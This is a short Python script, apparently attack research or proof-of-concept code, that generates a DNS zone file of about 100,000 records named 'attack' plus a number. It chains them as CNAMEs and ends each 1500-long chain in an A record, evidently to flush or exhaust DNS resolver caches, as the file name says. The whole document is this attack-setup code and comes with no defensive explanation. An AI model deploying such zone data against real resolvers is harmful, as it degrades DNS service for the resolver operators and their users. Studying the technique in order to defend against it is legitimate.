with open('CNAMECacheFlush_zone_file.txt', 'w') as f:
    DOMAINS_NUM = 100000
    for i in range(1, DOMAINS_NUM):
        if i % 1500 != 0:
            print(f'attack{i} 86400 IN    CNAME attack{i + 1}',file=f)
        else:
            print(f'attack{i} 86400 IN    A 1.1.1.1',file=f)
